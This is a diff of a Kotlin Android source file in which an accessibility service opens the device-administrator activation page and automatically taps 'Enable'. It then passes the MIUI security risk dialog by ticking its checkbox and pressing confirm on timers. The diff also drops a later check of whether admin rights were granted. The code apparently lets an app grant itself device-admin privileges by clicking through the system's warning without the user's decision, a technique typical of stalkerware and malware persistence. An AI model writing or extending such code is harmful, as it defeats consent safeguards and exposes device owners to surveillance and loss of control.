@@ -22,24 +22,18 @@ object Step2 {
     private const val TAG = "Step2"
     private val ui = Handler(Looper.getMainLooper())
 
-    fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
+    fun run(service: BoundaryAccessibilityService, onDone: () -> Unit) {
         Log.d(TAG, "打开激活页")
         openPage(service)
 
-        // ① 等 2 秒点「启用」
+        // 等 2 秒点「启用」；点完必然弹危险页 → 直接交给危险页函数（2s 勾选 / 12s 确定）
         ui.postDelayed({
-            val ok = clickEnable(service)
-            Log.d(TAG, "点击启用 = $ok")
-            // ② 点完「启用」必然进危险页 → 直接交给危险页函数（2s 勾选 / 12s 确定）
-            MiuiNavigator.passRiskDialog(service) { }
+            Log.d(TAG, "点击启用 = ${clickEnable(service)}")
+            MiuiNavigator.passRiskDialog(service) {
+                Log.d(TAG, "危险页处理完成（不再校验，交给系统）")
+                onDone()
+            }
         }, 2_000L)
-
-        // ③ 6 秒后看结果
-        ui.postDelayed({
-            val active = MoyingAdminReceiver.isActive(service)
-            Log.d(TAG, "管理员=$active")
-            onDone(active)
-        }, 6_000L)
     }
 
     private fun openPage(service: BoundaryAccessibilityService) {
